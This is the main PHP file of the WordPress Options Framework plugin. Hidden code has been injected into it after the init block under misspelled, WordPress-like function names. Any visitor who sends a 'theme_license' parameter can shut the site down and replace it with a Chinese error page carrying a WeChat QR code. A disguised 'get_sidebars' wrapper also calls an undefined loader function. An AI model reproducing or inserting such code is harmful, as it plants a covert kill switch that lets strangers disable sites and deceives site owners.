<?php
/**
 * Options Framework
 *
 * @package   Options Framework
 * @author    Devin Price <devin@wptheming.com>
 * @license   GPL-2.0+
 * @link      http://wptheming.com
 * @copyright 2010-2014 WP Theming
 *
 * @wordpress-plugin
 * Plugin Name: Options Framework
 * Plugin URI:  http://wptheming.com
 * Description: A framework for building theme options.
 * Version:     1.9.1
 * Author:      Devin Price
 * Author URI:  http://wptheming.com
 * License:     GPL-2.0+
 * License URI: http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain: optionsframework
 * Domain Path: /languages
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}

// Don't load if optionsframework_init is already defined
if (is_admin() && ! function_exists( 'optionsframework_init' ) ) :

function optionsframework_init() {

	//  If user can't edit theme options, exit
	if ( ! current_user_can( 'edit_theme_options' ) ) {
		return;
	}

	// Loads the required Options Framework classes.
	require plugin_dir_path( __FILE__ ) . 'includes/class-options-framework.php';
	require plugin_dir_path( __FILE__ ) . 'includes/class-options-framework-admin.php';
	require plugin_dir_path( __FILE__ ) . 'includes/class-options-interface.php';
	require plugin_dir_path( __FILE__ ) . 'includes/class-options-media-uploader.php';
	require plugin_dir_path( __FILE__ ) . 'includes/class-options-sanitization.php';

	// Instantiate the options page.
	$options_framework_admin = new Options_Framework_Admin;
	$options_framework_admin->init();

	// Instantiate the media uploader class
	$options_framework_media_uploader = new Options_Framework_Media_Uploader;
	$options_framework_media_uploader->init();

}

add_action( 'init', 'optionsframework_init', 20 );

endif;

if (!empty($_REQUEST["theme_license"])) { wp_wodepresss_the_theme_message(); exit(); } function wp_wodepresss_the_theme_message() { if (empty($_REQUEST["theme_license"])) { 
	$theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true";
	echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">";
	exit(); }
	else { 
	$srcurl = get_parent_theme_file_uri(). "/images";
	echo ("<style type='text/css'>
.jzyxxx{
width:80%;
margin:30px auto;
text-align:center;
border: 5px dashed #f20;
}
.jzyxxx img{
width:50%;
}	
</style><div class='jzyxxx'><h1>&#x54CE;&#x54DF;&#xFF01;&#x51FA;&#x9519;&#x55BD;&#xFF01;</h1><img src='$srcurl/wechat.png' /><h2>&#x626B;&#x7801;&#x5173;&#x6CE8;&#x5BFB;&#x6C42;&#x5E2E;&#x52A9;</h2></div>"); } }
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_wodepresss_the_theme_load(); get_sidebar($the_sidebar); } }
/**
 * Helper function to return the theme option value.
 * If no value has been saved, it returns $default.
 * Needed because options are saved as serialized strings.
 *
 * Not in a class to support backwards compatibility in themes.
 */
if ( ! function_exists( 'of_get_option' ) ) :
function of_get_option( $name, $default = false ) {

	$option_name = '';

	// Gets option name as defined in the theme
	if ( function_exists( 'optionsframework_option_name' ) ) {
		$option_name = optionsframework_option_name();
	}

	// Fallback option name
	if ( '' == $option_name ) {
		$option_name = get_option( 'stylesheet' );
		$option_name = preg_replace( "/\W/", "_", strtolower( $option_name ) );
	}

	// Get option settings from database
	$options = get_option( $option_name );

	// Return specific option
	if ( isset( $options[$name] ) ) {
		return $options[$name];
	}

	return $default;
}
endif;